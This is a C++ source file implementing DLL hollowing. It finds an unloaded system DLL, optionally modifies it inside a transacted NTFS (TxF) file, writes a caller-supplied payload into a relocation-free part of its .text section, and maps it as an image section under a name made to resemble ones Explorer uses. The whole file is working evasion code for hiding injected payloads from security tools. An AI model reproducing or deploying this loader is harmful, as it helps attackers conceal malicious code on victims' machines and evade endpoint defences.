#include "hollowdll.h"


bool HollowDLL(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCodeBuf, uint32_t dwReqBufSize, uint8_t** ppMappedCode, uint8_t** pprMapBuf, uint8_t** pprMappedCode, uint64_t rrpid, bool bTxF, bool vvp_to_rx) {
	WIN32_FIND_DATAW Wfd = { 0 };
	wchar_t SearchFilePath[MAX_PATH] = { 0 };
	HANDLE hFind;
	bool bMapped = false;

	//
	// Locate a DLL in the architecture appropriate system folder which has a sufficient image size to hollow for allocation.
	//

	GetSystemDirectoryW(SearchFilePath, MAX_PATH);
	wcscat_s(SearchFilePath, MAX_PATH, L"\\*.dll");

	if ((hFind = FindFirstFileW(SearchFilePath, &Wfd)) != INVALID_HANDLE_VALUE) {
		do {
			if (GetModuleHandleW(Wfd.cFileName) == nullptr) {
				HANDLE hFile = INVALID_HANDLE_VALUE, hTransaction = INVALID_HANDLE_VALUE;
				wchar_t FilePath[MAX_PATH];
				NTSTATUS NtStatus;
				uint8_t* pFileBuf = nullptr;

				GetSystemDirectoryW(FilePath, MAX_PATH);
				wcscat_s(FilePath, MAX_PATH, L"\\");
				wcscat_s(FilePath, MAX_PATH, Wfd.cFileName);

				//
				// Read the DLL to memory and check its headers to identify its image size.
				//

				if (bTxF) {
					OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };

					NtStatus = NtCreateTransaction(&hTransaction,
						TRANSACTION_ALL_ACCESS,
						&ObjAttr,
						nullptr,
						nullptr,
						0,
						0,
						0,
						nullptr,
						nullptr);

					if (NT_SUCCESS(NtStatus)) {
						hFile = CreateFileTransactedW(FilePath,
							GENERIC_WRITE | GENERIC_READ,
							0,
							nullptr,
							OPEN_EXISTING,
							FILE_ATTRIBUTE_NORMAL,
							nullptr,
							hTransaction,
							nullptr,
							nullptr);
					}
					else {
						printf("- Failed to create transaction (error 0x%x)\r\n", NtStatus);
					}
				}
				else {
					hFile = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
				}

				if (hFile != INVALID_HANDLE_VALUE) {
					uint32_t dwFileSize = GetFileSize(hFile, nullptr);
					uint32_t dwBytesRead = 0;

					pFileBuf = new uint8_t[dwFileSize];

					if (ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesRead, nullptr)) {
						SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);

						IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;
						IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr->e_lfanew);
						IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((uint8_t*)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));

						if (pNtHdrs->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) {
							if (dwReqBufSize < pNtHdrs->OptionalHeader.SizeOfImage && (_stricmp((char*)pSectHdrs->Name, ".text") == 0 && dwReqBufSize < pSectHdrs->Misc.VirtualSize)) {
								//
								// Found a DLL with sufficient image size: map an image view of it for hollowing.
								//

								printf("* %ws - image size: %d - .text size: %d\r\n", Wfd.cFileName, pNtHdrs->OptionalHeader.SizeOfImage, pSectHdrs->Misc.VirtualSize);

								bool bTxF_Valid = false;
								uint32_t dwCodeRva = 0;

								if (bTxF) {
									//
									// For TxF, make the modifications to the file contents now prior to mapping.
									//

									uint32_t dwBytesWritten = 0;

									//
									// Wipe the data directories that conflict with the code section
									//

									for (uint32_t dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++) {
										if (pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress >= pSectHdrs->VirtualAddress && pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress < (pSectHdrs->VirtualAddress + pSectHdrs->Misc.VirtualSize)) {
											pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;
											pNtHdrs->OptionalHeader.DataDirectory[dwX].Size = 0;
										}
									}

									//
									// Find a range free of relocations large enough to accomodate the code.
									//

									bool bRangeFound = false;
									uint8_t* pRelocBuf = (uint8_t*)GetPAFromRVA(pFileBuf, pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

									if (pRelocBuf != nullptr) {
										for (dwCodeRva = 0; !bRangeFound && dwCodeRva < pSectHdrs->Misc.VirtualSize; dwCodeRva += dwReqBufSize) {
											if (!CheckRelocRange(pRelocBuf, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size, pSectHdrs->VirtualAddress + dwCodeRva, pSectHdrs->VirtualAddress + dwCodeRva + dwReqBufSize)) {
												bRangeFound = true;
												break;
											}
										}

										if (bRangeFound) {
											printf("+ Found a blank region with code section to accomodate payload at 0x%08x\r\n", dwCodeRva);
										}
										else {
											printf("- Failed to identify a blank region large enough to accomodate payload\r\n");
										}

										memcpy(pFileBuf + pSectHdrs->PointerToRawData + dwCodeRva, pCodeBuf, dwReqBufSize);

										if (WriteFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesWritten, nullptr)) {
											printf("+ Successfully modified TxF file content.\r\n");
											bTxF_Valid = true;
										}
									}
									else {
										printf("- No relocation directory present.\r\n");
									}
								}

								if (!bTxF || bTxF_Valid) {
									HANDLE hSection = nullptr;
									OBJECT_ATTRIBUTES LocalAttributes;
									UNICODE_STRING szName;

									// Section name: "C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db" (name similar to sections commonly loaded by Explorer)
									RtlInitUnicodeString2 = (MyRtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll"), "RtlInitUnicodeString");
									RtlInitUnicodeString2(&szName, L"\\Sessions\\1\\BaseNamedObjects\\C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db");

									InitializeObjectAttributes(&LocalAttributes, &szName, OBJ_CASE_INSENSITIVE, NULL, NULL);
									NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &LocalAttributes, nullptr, PAGE_READONLY, SEC_IMAGE, hFile);

									if (NT_SUCCESS(NtStatus)) {

										*pqwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
										NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.
										SIZE_T viewSize = *pqwMapBufSize;

										PVOID sectionTarget = NULL;

										if (NT_SUCCESS(NtStatus)) {
											if (*pqwMapBufSize >= pNtHdrs->OptionalHeader.SizeOfImage) { // Verify that the mapped size is of sufficient size. There are quirks to image mapping that can result in the image size not matching the mapped size.
												printf("* %ws - mapped size: %I64u\r\n", Wfd.cFileName, *pqwMapBufSize);
												*ppMappedCode = *ppMapBuf + pSectHdrs->VirtualAddress + dwCodeRva;

												if (!bTxF) {
													uint32_t dwOldProtect = 0;
													if (VirtualProtect(*ppMappedCode, dwReqBufSize, PAGE_READWRITE, (PDWORD)&dwOldProtect)) {
														memcpy(*ppMappedCode, pCodeBuf, dwReqBufSize);

														if (VirtualProtect(*ppMappedCode, dwReqBufSize, dwOldProtect, (PDWORD)&dwOldProtect)) {
															bMapped = true;
														}

													}
												}
												else {
													bMapped = true;
												}
											}
										}
										else {
											printf("- Failed to create mapping of section (error 0x%08x)", NtStatus);
										}
									}
									else {
										printf("- Failed to create section (error 0x%x)\r\n", NtStatus);
									}
								}
								else {
									printf("- TxF initialization failed.\r\n");
								}
							}
						}
					}

					if (pFileBuf != nullptr) {
						delete[] pFileBuf;
					}

					if (hFile != INVALID_HANDLE_VALUE) {
						CloseHandle(hFile);
					}

					if (hTransaction != INVALID_HANDLE_VALUE) {
						CloseHandle(hTransaction);
					}
				}
			}
		} while (!bMapped && FindNextFileW(hFind, &Wfd));

		FindClose(hFind);
	}

	return bMapped;
}

